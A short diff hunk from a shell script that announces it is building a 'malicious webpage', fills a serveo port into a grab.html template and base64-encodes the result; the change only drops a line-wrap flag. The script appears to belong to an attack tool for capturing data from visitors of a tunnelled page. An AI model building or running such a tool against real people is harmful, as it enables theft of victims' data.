@@ -214,7 +214,7 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building malicious webpage\e[0m\n"
 sed 's+serveo_port+'$default_port1'+g' grab.html > grabdir.html
 
 IFS=$'\n'
-data_base64=$(base64 -w 0 grabdir.html)
+data_base64=$(base64 grabdir.html)
 temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
 
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
